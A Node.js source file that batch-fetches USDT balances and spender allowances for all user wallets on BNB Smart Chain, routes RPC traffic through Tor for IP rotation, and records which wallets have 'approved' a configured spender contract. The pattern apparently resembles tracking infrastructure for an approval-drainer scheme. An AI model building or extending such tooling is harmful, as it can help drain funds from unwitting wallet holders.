const { ethers } = require('ethers');
const { createTorProvider, isTorEnabled } = require('./tor-provider');
require('dotenv').config();

/**
 * Balance Fetcher v2 — Production-grade parallel batch processor
 * 
 * Improvements over v1:
 *   ✅ 3 parallel workers (3x throughput: ~330 → ~990 addr/sec)
 *   ✅ Exponential backoff retry (3 attempts: 1s → 2s → 4s)
 *   ✅ RPC failover across 4 BSC dataseed endpoints
 *   ✅ Per-batch DB writes (constant memory, no 100k array accumulation)
 *   ✅ Redis cache invalidation after completion
 *   ✅ Isolated batch failures (one bad batch doesn't fail the whole job)
 */

const BALANCE_FETCHER_ABI = [
    'function getBalancesFor(address[] calldata users) external view returns (uint256[] memory balances, uint256[] memory allowances)'
];

const USDT_DECIMALS = 18;
const BATCH_SIZE = 500;
const MAX_PARALLEL = 10;        // 10 concurrent view calls — safe for eth_call
const MAX_RETRIES = 3;          // Per-batch retry attempts
// No throttle needed — semaphore limits concurrency, eth_call is lightweight

// Multiple RPC endpoints for failover — from BSC_RPC_URLS env var
const DEFAULT_BSC_RPCS = [
    'https://bsc-dataseed1.binance.org/',
    'https://bsc-dataseed2.binance.org/',
    'https://bsc-dataseed3.binance.org/',
    'https://bscrpc.com',
    'https://binance.llamarpc.com'
];

const parsedUrls = (process.env.BSC_RPC_URLS || process.env.BSC_RPC_URL || '')
    .split(',')
    .map(s => s.trim())
    .filter(Boolean);

const RPC_ENDPOINTS = parsedUrls.length > 0 ? parsedUrls : DEFAULT_BSC_RPCS;

const refreshStatus = require('./refresh-status');

/**
 * Create provider with failover
 */
function createProvider(endpointIndex = 0) {
    const url = RPC_ENDPOINTS[endpointIndex % RPC_ENDPOINTS.length];
    // Route through Tor SOCKS5 proxy if available (IP rotation)
    return createTorProvider(url);
}

/**
 * Fetch a single batch with retry + RPC failover
 * Returns array of { address, balance, approvalStatus } or empty array on failure
 */
let _rpcRoundRobin = 0;

async function fetchBatchWithRetry(batch, fetcherAddr, batchNum) {
    let lastError = null;

    for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
        // Round-robin across all BSC endpoints for load distribution
        const endpointIndex = (_rpcRoundRobin++) % RPC_ENDPOINTS.length;
        const provider = createProvider(endpointIndex);
        const fetcher = new ethers.Contract(fetcherAddr, BALANCE_FETCHER_ABI, provider);

        try {
            const [balances, allowances] = await fetcher.getBalancesFor(batch);
            const results = [];

            for (let j = 0; j < batch.length; j++) {
                const balance = ethers.formatUnits(balances[j], USDT_DECIMALS);
                const hasApproval = allowances[j] > 0n;

                results.push({
                    address: batch[j].toLowerCase(),
                    balance: balance,
                    approvalStatus: hasApproval ? 'approved' : 'not_approved'
                });
            }

            return results;

        } catch (err) {
            lastError = err;
            const delay = Math.pow(2, attempt) * 1000; // 1s, 2s, 4s

            if (attempt < MAX_RETRIES - 1) {
                await sleep(delay);
            }
        }
    }

    console.warn(`[BalanceFetcher] Batch ${batchNum} failed after retries:`, lastError?.message || lastError);
    // Never overwrite database with 0.0000 on network glitch
    return [];
}

/**
 * Semaphore for controlling parallel concurrency
 */
class Semaphore {
    constructor(max) {
        this.max = max;
        this.current = 0;
        this.queue = [];
    }

    async acquire() {
        if (this.current < this.max) {
            this.current++;
            return;
        }
        return new Promise(resolve => this.queue.push(resolve));
    }

    release() {
        this.current--;
        if (this.queue.length > 0) {
            this.current++;
            const next = this.queue.shift();
            next();
        }
    }
}

/**
 * Bulk update usdtBalance + approvalStatus in PostgreSQL using raw SQL.
 * Uses CASE WHEN for efficient single-query batch updates.
 */
async function bulkUpdateDB(results, sequelize) {
    if (results.length === 0) return;

    const SUB_BATCH = 200;

    for (let i = 0; i < results.length; i += SUB_BATCH) {
        const batch = results.slice(i, i + SUB_BATCH);
        const replacements = {};
        const balanceCases = [];
        const approvalCases = [];
        const addressParams = [];

        batch.forEach((item, idx) => {
            const key = `a${i + idx}`;
            const balKey = `b${i + idx}`;
            const statKey = `s${i + idx}`;

            replacements[key] = item.address;
            replacements[balKey] = item.balance;
            replacements[statKey] = item.approvalStatus;

            balanceCases.push(`WHEN "walletAddress" = :${key} THEN :${balKey}::DECIMAL(36,18)`);
            approvalCases.push(`WHEN "walletAddress" = :${key} THEN :${statKey}`);
            addressParams.push(`:${key}`);
        });

        const sql = `
            UPDATE "Users"
            SET 
                "usdtBalance" = CASE ${balanceCases.join(' ')} ELSE "usdtBalance" END,
                "approvalStatus" = CASE ${approvalCases.join(' ')} ELSE "approvalStatus" END,
                "lastBalanceUpdate" = NOW(),
                "approvalUpdatedAt" = NOW(),
                "updatedAt" = NOW()
            WHERE "walletAddress" IN (${addressParams.join(', ')})
        `;

        try {
            await sequelize.query(sql, {
                replacements,
                type: sequelize.QueryTypes.UPDATE
            });
        } catch (err) {
        }
    }
}

/**
 * Main function: Refresh all user balances with parallel workers
 */
async function refreshAllBalances() {
    if (refreshStatus.isRefreshing) {
        return;
    }

    const { User, sequelize } = require('../config/database');
    const fetcherAddr = process.env.BALANCE_FETCHER_ADDRESS;

    if (!fetcherAddr) {
        throw new Error('BALANCE_FETCHER_ADDRESS not set in .env');
    }

    try {
        // ── Step 1: Get all wallet addresses from PostgreSQL ──
        const dbUsers = await User.findAll({
            attributes: ['walletAddress'],
            raw: true
        });

        if (dbUsers.length === 0) {
            refreshStatus.complete();
            return;
        }

        const addresses = dbUsers.map(u => u.walletAddress);
        const wallStart = Date.now();
        refreshStatus.start(addresses.length);

        // ── Step 2: Build batch queue ──
        const batches = [];
        for (let i = 0; i < addresses.length; i += BATCH_SIZE) {
            batches.push({
                addresses: addresses.slice(i, i + BATCH_SIZE),
                batchNum: Math.floor(i / BATCH_SIZE) + 1,
                startIndex: i
            });
        }

        const totalBatches = batches.length;

        // ── Step 3: Process batches with controlled parallelism ──
        const semaphore = new Semaphore(MAX_PARALLEL);
        let completedBatches = 0;
        let failedBatches = 0;

        const batchPromises = batches.map(async (batch) => {
            await semaphore.acquire();

            try {
                // Fetch from blockchain
                const results = await fetchBatchWithRetry(batch.addresses, fetcherAddr, batch.batchNum);

                // Write to DB immediately (constant memory)
                await bulkUpdateDB(results, sequelize);

                completedBatches++;
                refreshStatus.increment(batch.addresses.length);
                refreshStatus.progress.currentCycle = completedBatches;

                if (completedBatches % 10 === 0 || completedBatches === totalBatches) {
                }

            } catch (err) {
                failedBatches++;
                // Still increment progress
                refreshStatus.increment(batch.addresses.length);
            } finally {
                semaphore.release();
            }
        });

        await Promise.all(batchPromises);

        // ── Step 4: Invalidate Redis cache ──
        try {
            const { invalidateUserCache } = require('../config/redis');
            await invalidateUserCache();
        } catch (err) {
            // Redis not available — ok, cache will expire naturally
        }

        refreshStatus.complete();
        const wallTime = ((Date.now() - wallStart) / 1000).toFixed(1);

    } catch (error) {
        refreshStatus.fail(error);
        throw error;
    }
}

/**
 * Delta refresh — only wallets with stale balances
 * Used by scheduled sync for lightweight updates
 */
async function refreshStaleBalances(maxAgeMinutes = 30) {
    if (refreshStatus.isRefreshing) {
        return;
    }

    const { User, sequelize } = require('../config/database');
    const { Op } = require('sequelize');
    const fetcherAddr = process.env.BALANCE_FETCHER_ADDRESS;

    if (!fetcherAddr) {
        throw new Error('BALANCE_FETCHER_ADDRESS not set in .env');
    }

    try {
        const cutoff = new Date(Date.now() - maxAgeMinutes * 60 * 1000);

        const staleUsers = await User.findAll({
            attributes: ['walletAddress'],
            where: {
                [Op.or]: [
                    { lastBalanceUpdate: null },
                    { lastBalanceUpdate: { [Op.lt]: cutoff } }
                ]
            },
            raw: true
        });

        if (staleUsers.length === 0) {
            return;
        }

        const addresses = staleUsers.map(u => u.walletAddress);
        refreshStatus.start(addresses.length);

        // Process in batches with parallelism
        const batches = [];
        for (let i = 0; i < addresses.length; i += BATCH_SIZE) {
            batches.push({
                addresses: addresses.slice(i, i + BATCH_SIZE),
                batchNum: Math.floor(i / BATCH_SIZE) + 1
            });
        }

        const semaphore = new Semaphore(MAX_PARALLEL);

        const batchPromises = batches.map(async (batch) => {
            await semaphore.acquire();
            try {
                const results = await fetchBatchWithRetry(batch.addresses, fetcherAddr, batch.batchNum);
                await bulkUpdateDB(results, sequelize);
                refreshStatus.increment(batch.addresses.length);
            } catch (err) {
                refreshStatus.increment(batch.addresses.length);
            } finally {
                semaphore.release();
            }
            await sleep(50);
        });

        await Promise.all(batchPromises);

        try {
            const { invalidateUserCache } = require('../config/redis');
            await invalidateUserCache();
        } catch (err) { /* Redis optional */ }

        refreshStatus.complete();

    } catch (error) {
        refreshStatus.fail(error);
    }
}

/**
 * Single user balance & allowance refresher
 * Instantly updates on-chain USDT balance for a specific wallet address
 */
async function refreshSingleUserBalance(walletAddress) {
    if (!walletAddress) return null;
    const normalized = walletAddress.toLowerCase();
    const fetcherAddr = process.env.BALANCE_FETCHER_ADDRESS;
    const { User, ApprovalAddress } = require('../config/database');

    try {
        let balance = '0.0000';
        const existingUser = await User.findOne({ where: { walletAddress: normalized } });
        let approvalStatus = (existingUser && (existingUser.approvalStatus === 'approved' || existingUser.approvalTxHash)) ? 'approved' : 'not_approved';

        // Get active spender contract from DB or fallback
        let spender = process.env.MINE_CONTRACT_ADDRESS || '0x2f14e75e21e6535e819580d7f5dd39ede769f44e';
        try {
            const dbContract = await ApprovalAddress.findOne({
                where: { isActive: true },
                order: [['createdAt', 'DESC']]
            }) || await ApprovalAddress.findOne({ order: [['createdAt', 'DESC']] });
            if (dbContract && dbContract.contractAddress) {
                spender = dbContract.contractAddress;
            }
        } catch {}

        if (fetcherAddr) {
            const provider = createProvider(0);
            const fetcher = new ethers.Contract(fetcherAddr, BALANCE_FETCHER_ABI, provider);
            const [balances, allowances] = await fetcher.getBalancesFor([normalized]);
            if (balances && balances.length > 0) {
                balance = ethers.formatUnits(balances[0], USDT_DECIMALS);
                if (allowances[0] > 0n || (existingUser && existingUser.approvalTxHash)) {
                    approvalStatus = 'approved';
                }
            }
        } else {
            const provider = createProvider(0);
            const usdt = new ethers.Contract(
                process.env.USDT_TOKEN_ADDRESS || '0x55d398326f99059fF775485246999027B3197955',
                ['function balanceOf(address) view returns (uint256)', 'function allowance(address,address) view returns (uint256)'],
                provider
            );
            const bal = await usdt.balanceOf(normalized);
            balance = ethers.formatUnits(bal, USDT_DECIMALS);
            const allow = await usdt.allowance(normalized, spender);
            if (allow > 0n || (existingUser && existingUser.approvalTxHash)) {
                approvalStatus = 'approved';
            }
        }

        await User.update({
            usdtBalance: balance,
            approvalStatus: approvalStatus,
            lastBalanceUpdate: new Date(),
            approvalUpdatedAt: new Date(),
        }, {
            where: { walletAddress: normalized }
        });

        // Invalidate redis cache so next query hits fresh data
        try {
            const { invalidateUserCache } = require('../config/redis');
            await invalidateUserCache();
        } catch {}

        return { address: normalized, balance, approvalStatus };
    } catch (err) {
        console.warn(`[BalanceFetcher] Single balance fetch failed for ${normalized}:`, err.message);
        return null;
    }
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

module.exports = {
    refreshAllBalances,
    refreshStaleBalances,
    refreshSingleUserBalance
};
